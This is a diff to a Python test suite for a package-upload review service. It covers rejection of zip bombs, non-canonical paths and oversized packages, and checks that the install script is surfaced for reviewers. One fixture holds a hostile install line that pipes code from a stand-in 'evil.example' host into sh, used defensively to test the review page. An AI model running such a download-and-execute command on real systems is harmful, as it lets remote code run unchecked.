@@ -297,8 +297,8 @@ class TestRejections(UploadBase):
         self.rejected(test_zip(extra=[('dup.txt', 'a'), ('dup.txt', 'b')]), 'same path twice', 'duplicate entries')
         self.rejected(test_zip(extra=[('big.sh', '#!/bin/sh\r\necho hi\r\n')]), 'CRLF', 'CRLF script')
         self.rejected(make_zip([('readme.txt', 'x')]), 'neither test-definition.xml nor suite-definition.xml', 'no definition')
-        self.rejected(make_zip([('f%d.txt' % i, 'x') for i in range(520)] + [('test-definition.xml', TEST_XML % {'title': 't', 'version': '1.0.0'})]), 'too many files', 'over 500 entries')
-        self.rejected(make_zip([('test-definition.xml', TEST_XML % {'title': 't', 'version': '1.0.0'}), ('suite-definition.xml', '<x/>')]), 'both', 'both definitions')
+        self.rejected(make_zip([('f%d.txt' % i, 'x') for i in range(520)] + [('test-definition.xml', TEST_XML % {'title': 'QC Title', 'version': '1.0.0'})]), 'too many files', 'over 500 entries')
+        self.rejected(make_zip([('test-definition.xml', TEST_XML % {'title': 'QC Title', 'version': '1.0.0'}), ('suite-definition.xml', '<x/>')]), 'both', 'both definitions')
         self.rejected(test_zip(extra=[('zeros.bin', b'\0' * (40 * 1024 * 1024))]), 'expands', 'zip bomb')
         self.rejected(test_zip(), 'is not valid', 'bad name', name='Bad Name!')
         self.rejected(test_zip(version='1.0'), 'failed schema validation', 'bad version')
@@ -527,18 +527,18 @@ class TestReviewShowsWhatClientsRun(UploadBase):
         before = len(audit(Action='upload_rejected'))
         for name in ('./downloads.xml', '//downloads.xml', 'Downloads.xml', 'DOWNLOADS.XML', './results-definition.xml', 'sub//x.sh', './install.sh', 'a/./b.sh'):
             with self.subTest(name):
-                z = make_zip([('test-definition.xml', TEST_XML % {'title': 't', 'version': '1.0.0'}), (name, dl)])
+                z = make_zip([('test-definition.xml', TEST_XML % {'title': 'QC Title', 'version': '1.0.0'}), (name, dl)])
                 status, headers, _ = stage(self.admin, z)
                 self.assertIsNone(stage_id(headers), name)
                 self.assertIn('not in canonical form', flash_of(self.admin, UPLOAD), name)
-        z = make_zip([('./test-definition.xml', TEST_XML % {'title': 't', 'version': '1.0.0'})])
+        z = make_zip([('./test-definition.xml', TEST_XML % {'title': 'QC Title', 'version': '1.0.0'})])
         stage(self.admin, z)
         self.assertIn('not in canonical form', flash_of(self.admin, UPLOAD))
         self.assertEqual(staged_dirs(), [])
         self.assertEqual(len(audit(Action='upload_rejected')), before + 9)
 
     def test_a_backslash_zip_is_rewritten_and_both_hashes_are_recorded(self):
-        z = test_zip(extra=[('sub\\\\tool.sh', '#!/bin/sh\necho hi\n')])
+        z = test_zip(extra=[('sub\\tool.sh', '#!/bin/sh\necho hi\n')])
         name = uniq('bsl')
         sid = stage_id(stage(self.admin, z, filename=name + '.zip')[1])
         self.assertTrue(sid)
@@ -550,7 +550,7 @@ class TestReviewShowsWhatClientsRun(UploadBase):
     def test_decoy_scripts_cannot_starve_the_real_install_script(self):
         evil = b'#!/bin/sh\ncurl -s http://evil.example/real-payload | sh\n'
         decoys = [('a%02d.sh' % i, ''.join('echo decoy %d %d\n' % (i, j) for j in range(5500))) for i in range(40)]      # about 2.8 MB of scripts
-        sid, page = self.review(make_zip([('test-definition.xml', TEST_XML % {'title': 't', 'version': '1.0.0'}), ('install.sh', evil)] + decoys))
+        sid, page = self.review(make_zip([('test-definition.xml', TEST_XML % {'title': 'QC Title', 'version': '1.0.0'}), ('install.sh', evil)] + decoys))
         scripts_part = page.split('Scripts and definition files')[1]
         self.assertIn('real-payload', scripts_part, 'install.sh is read first, whatever else is in the package')
         self.assertLess(scripts_part.index('real-payload'), scripts_part.index('decoy 0 0') if 'decoy 0 0' in scripts_part else 10 ** 9)
@@ -559,12 +559,12 @@ class TestReviewShowsWhatClientsRun(UploadBase):
         self.assertRegex(page, r'NOT SHOWN: preview budget used up')
         # the same package with fewer decoys fits and is confirmable
         few = decoys[:20]
-        sid2, page2 = self.review(make_zip([('test-definition.xml', TEST_XML % {'title': 't2', 'version': '1.0.0'}), ('install.sh', evil)] + few))
+        sid2, page2 = self.review(make_zip([('test-definition.xml', TEST_XML % {'title': 'QC Title Two', 'version': '1.0.0'}), ('install.sh', evil)] + few))
         self.assertNotIn('Too large to review completely', page2)
         self.assertIn('name="reviewed"', page2)
 
     def test_lifecycle_scripts_are_listed_in_the_order_clients_run_them(self):
-        z = make_zip([('test-definition.xml', TEST_XML % {'title': 't', 'version': '1.0.0'}), ('zzz-helper.sh', '#!/bin/sh\necho helper-zzz\n'), ('post.sh', '#!/bin/sh\necho post-run\n'),
+        z = make_zip([('test-definition.xml', TEST_XML % {'title': 'QC Title', 'version': '1.0.0'}), ('zzz-helper.sh', '#!/bin/sh\necho helper-zzz\n'), ('post.sh', '#!/bin/sh\necho post-run\n'),
                       ('install.sh', '#!/bin/sh\necho install-run\n'), ('pre.sh', '#!/bin/sh\necho pre-run\n'), ('notes.txt', 'just notes\n')])
         sid, page = self.review(z)
         part = page.split('Scripts and definition files')[1]
